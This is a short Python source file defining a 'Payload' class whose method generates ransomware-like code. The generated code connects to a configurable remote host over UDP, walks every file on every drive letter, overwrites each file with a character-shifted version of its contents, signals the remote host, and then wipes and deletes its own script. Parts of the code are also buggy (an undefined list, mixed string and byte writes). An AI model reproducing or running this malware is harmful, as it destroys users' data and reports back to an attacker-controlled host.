class Payload:
    def __init__(self, host, port, shift, strs):
        self.host,self.port,self.strs, self.shift  = host,port,strs, shift
    def create(self):
        return f"""
conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
conn.connect(('{self.host}' , int({self.port})))
from os import walk\nfrom string import ascii_lowercase as a
for l in a:\n\ttry :\n\t\topen(l +':\\')\n\texcept:\n\t\tpass\n\telse :ds.append(l)
for d in ds:\n\tfor r, _, fs in walk(d):\n\t\tif len(fs) == 0:\n\t\t\tpass\n\t\tfor f in fs:\n\t\t\twith open(r +'\\' +f, "rb+") as f:
\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {int(self.shift)}for l in fd)))
conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
        """
